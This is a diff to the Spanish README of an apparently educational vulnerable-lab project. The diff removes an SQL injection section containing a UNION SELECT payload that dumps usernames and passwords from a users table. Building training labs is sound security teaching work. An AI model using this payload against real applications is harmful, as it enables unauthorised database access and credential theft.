@@ -24,15 +24,6 @@ cd insecure-labs
 docker-compose up --build -d
 ```
 
-## 1️⃣ SQL Injection (SQLi-Lab)
-- Aplicación vulnerable a inyección SQL en la búsqueda de productos.
-- URL: `/buscar?nombre=producto`
-
-Prueba un payload como en la barra de búsqueda:
-```sh
-' union select user(),(select group_concat(username,':', password) from users),3 -- -
-```
-
 ## ⚠️ Advertencia
 Este proyecto es solo para **fines educativos y de investigación**. No se debe utilizar en entornos de producción ni para actividades malintencionadas.
 
